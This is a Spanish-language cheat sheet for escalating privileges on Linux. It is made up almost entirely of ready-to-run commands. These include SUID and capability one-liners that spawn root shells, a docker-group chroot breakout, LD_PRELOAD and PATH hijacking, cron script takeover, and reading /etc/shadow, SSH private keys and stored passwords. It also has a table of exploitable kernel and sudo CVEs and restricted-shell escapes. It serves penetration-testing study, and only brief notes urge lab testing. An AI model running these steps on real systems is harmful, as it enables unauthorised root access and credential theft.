# ESCALADA DE PRIVILEGIOS EN LINUX

## 1. Información del Sistema

```bash
# SO y kernel
cat /etc/os-release
uname -a
uname -r

# Usuarios
whoami
id
cat /etc/passwd
cat /etc/shadow        # requiere root o grupo shadow
cat /etc/group

# Procesos
ps aux
ps aux | grep root
```

## 2. Archivos SUID / SGID

```bash
# Binarios SUID (se ejecutan como el propietario, normalmente root)
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -u=s -type f 2>/dev/null

# Archivos SGID (heredan el grupo del propietario)
find / -perm -2000 -type f 2>/dev/null

# Directorios SGID escribibles
find / -type d -perm -2000 -perm -002 2>/dev/null

# Detectar los que no están en la lista del sistema base
# (comparar la salida con la de una instalación limpia)
```

> Consultar cada binario encontrado en GTFOBins antes de probar nada: no todo
> SUID es explotable, y algunos (nmap, find, vim, tar, less) tienen abusos
> documentados.

```bash
# Ejemplos típicos de abuso
nmap --interactive              # dentro: !sh
find . -exec /bin/sh -p \; -quit
vim -c ':!/bin/sh'
awk 'BEGIN{system("/bin/sh")}'
less /etc/passwd                # dentro: !sh
```

## 3. Tareas Programadas (Cron)

```bash
# Cron del sistema y de usuario
cat /etc/crontab
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
crontab -l
crontab -l -u root 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null

# Scripts invocados por cron: buscar los que sean escribibles
# por nuestro usuario, o rutas relativas sin ruta absoluta (PATH hijacking)
grep -R "root" /etc/cron* 2>/dev/null

# Ver la ejecución en tiempo real sin privilegios
./pspy64
```

> Cualquier script que ejecute cron como root y al que podamos escribir equivale
> a root. Si la tarea lo llama sin ruta absoluta, crear un binario con ese
> nombre en un directorio que esté antes en el `PATH`.

## 4. Capabilities

```bash
# Todas las capabilities del sistema
getcap -r / 2>/dev/null

# Las peligrosas
#   cap_setuid      cambiar el UID efectivo
#   cap_setgid      cambiar el GID efectivo
#   cap_dac_read_search  leer cualquier fichero
#   cap_sys_admin   montar, nsenter, casi root
#   cap_net_raw     sniffing / paquetes crudos
```

```bash
# Ejemplo con cap_setuid sobre python
getcap /usr/bin/python3.9
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Ejemplo con cap_dac_read_search: leer /etc/shadow sin ser root
```

## 5. Sudo y Grupos Privilegiados

```bash
# Qué puede hacer nuestro usuario
sudo -l

# Versión de sudo (CVE-2021-3156, Baron Samedit)
sudo -V

# Grupos que dan acceso de facto
id
#   docker        -> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
#   lxd / lxc     -> montar el sistema de ficheros del host
#   disk          -> debugfs para leer cualquier dispositivo
#   adm           -> leer logs del sistema
#   shadow        -> leer /etc/shadow
```

```bash
# Variables de entorno heredadas por sudo
sudo -l | grep -i env_keep
# Si respeta LD_PRELOAD o LD_LIBRARY_PATH, se puede inyectar una librería

# Rutas de sudoedit mal configuradas
sudo -l | grep -i sudoedit
```

## 6. Kernels Vulnerables y Exploits Conocidos

```bash
# Identificar versión exacta antes de buscar exploit
uname -r
cat /proc/version
lsb_release -a

# Buscar exploits para esa versión
searchsploit linux kernel $(uname -r | cut -d- -f1) privilege escalation
searchsploit --id linux local privilege escalation

# Sugeridor automático
./linux-exploit-suggester.sh
```

| Vulnerabilidad | CVE | Kernel / paquete afectado |
|---|---|---|
| Dirty Pipe | CVE-2022-0847 | 5.8 – 5.16.11 |
| nf_tables | CVE-2024-1086 | 5.14 – 6.6 |
| Baron Samedit | CVE-2021-3156 | sudo < 1.9.5p2 |
| PwnKit | CVE-2021-4034 | pkexec (polkit) |
| OverlayFS | CVE-2021-3493 | Ubuntu, kernels < 5.11 |
| Dirty COW | CVE-2016-5195 | 2.6.22 – 4.8.3 |

> Los exploits de kernel pueden provocar un *kernel panic*. En un entorno real
> esto tira el objetivo: valorar el riesgo y probar siempre primero en un
> laboratorio con la misma versión.

## 7. Credenciales y Archivos Sensibles

```bash
# Historial y configuración de usuario
cat ~/.bash_history
cat ~/.ssh/id_rsa 2>/dev/null
ls -la ~/.ssh

# Credenciales en aplicaciones web y ficheros de configuración
grep -rIl "password" /var/www /opt /home /srv 2>/dev/null
find / -name "*.conf" -o -name "*.env" -o -name "config.php" 2>/dev/null

# Ficheros de backup y bases de datos locales
find / -name "*.bak" -o -name "*.sql" -o -name "*.old" 2>/dev/null

# Montajes y recursos compartidos sin autenticación
cat /etc/exports
mount
showmount -e localhost
```

## 8. Servicios, PATH y Permisos

```bash
# Servicios que se ejecutan como root con binarios escribibles
systemctl list-units --type=service --state=running
ps -eo user,pid,cmd | grep root

# Directorios y ficheros en los que podemos escribir
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null

# PATH hijacking: si un servicio root llama a un binario sin ruta absoluta
echo $PATH
```

> Un script que se ejecuta como root y llama a `tar` sin ruta absoluta ejecutará
> el `tar` que encuentre antes en el `PATH`. Si algún directorio del `PATH` es
> escribible, es root.

## 9. Herramientas de Escalada

```bash
# Enumeración automática
./linpeas.sh
./LinEnum.sh
./lse.sh

# Procesos en tiempo real (sin privilegios)
./pspy64

# Búsqueda de exploits
./linux-exploit-suggester.sh
searchsploit linux privilege escalation
```

## 10. Shell y TTY

```bash
# Shell interactiva completa con python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, luego en local:
#   stty raw -echo; fg

# Si la shell está restringida (rbash), probar escapes
vi          # dentro: :!/bin/sh
less /etc/passwd    # dentro: !sh
find / -exec /bin/sh \; -quit
awk 'BEGIN{system("/bin/sh")}'
man ls      # dentro: !sh
```

> Comprobar el `$PATH` y las variables de entorno al aterrizar: una shell
> restringida suele delatarse por un `PATH` mínimo y `SHELL` apuntando a
> `rbash`.
